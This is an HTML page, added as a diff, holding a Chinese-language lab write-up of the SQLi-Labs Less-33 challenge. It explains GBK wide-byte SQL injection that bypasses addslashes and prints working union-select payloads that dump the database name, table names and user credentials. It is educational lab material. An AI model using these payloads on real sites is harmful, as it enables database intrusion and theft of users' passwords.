@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-33 宽字节注入与 addslashes 绕过 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-33 宽字节注入与 addslashes 绕过 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.27 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 宽字节注入, addslashes</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-33 (GET - Bypass addslashes)</li>
+        <li><strong>提示：</strong>页面回显转义结果及十六进制编码。单引号被转义，需使用宽字节绕过。</li>
+    </ul>
+
+    <h2>2. 核心原理：GBK 宽字节注入</h2>
+    <p>本关卡与 Less-32 的核心机制完全相同。区别仅在于后端转义函数从自定义的 <code>check_addslashes()</code> 换成了 PHP 内置的 <code>addslashes()</code>。</p>
+    <ul>
+        <li><strong>防御机制</strong>：<code>addslashes()</code> 会在单引号 <code>'</code>（<code>0x27</code>）前加上反斜杠 <code>\</code>（<code>0x5C</code>）。</li>
+        <li><strong>绕过机制</strong>：由于数据库使用 GBK 编码，输入 <code>%df'</code>（<code>0xDF 0x27</code>）被转义后变为 <code>0xDF 0x5C 0x27</code>。<code>0xDF</code> 和 <code>0x5C</code> 被解析为一个双字节汉字，单引号 <code>0x27</code> 成功逃逸。</li>
+    </ul>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：验证转义与字节拼接</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=1%df'</code></p>
+    <p><strong>回显现象：</strong>底部提示 <code>Hex becomes : 31 df 5c 27</code>。<code>df</code> 与 <code>5c</code> 紧密相连，证明宽字节条件已满足。</p>
+
+    <p><strong>第二步：爆库名</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=-1%df' union select 1,2,database()-- -</code></p>
+    <p><strong>回显现象：</strong>页面第 2 列回显 <code>security</code>。</p>
+
+    <p><strong>第三步：爆表名</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=-1%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- -</code></p>
+    <p><strong>回显现象：</strong>页面回显 <code>emails,referrers,uagents,users</code>。</p>
+
+    <p><strong>第四步：脱库获取账号密码</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=-1%df' union select 1,2,group_concat(username,0x3a,password) from users-- -</code></p>
+    <p><strong>回显现象：</strong>页面直接爆出所有用户的账号和密码（如 <code>Dumb:Dumb</code>、<code>admin:p@ssw0rd</code> 等）。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>编码陷阱</strong>：<code>%df</code> 必须直接发送原始字节。如果在 Burp 或其他工具中使用了 URL 编码功能，<code>%</code> 被二次编码为 <code>%25</code>，宽字节注入将直接失效。</li>
+        <li><strong>闭合与注释</strong>：闭合符为单引号，注释符使用 <code>-- -</code>（URL 中写为 <code>--%20-</code>）。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>宽字节注入</strong>：利用字符集（GBK）的双字节特性，通过构造高位字节吞掉转义符 <code>\</code>，使引号逃逸。</li>
+        <li><strong>不同防御函数的同源性</strong>：理解 <code>addslashes</code> 等转义函数的底层原理，以及它们在非 UTF-8 字符集下的共有缺陷。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
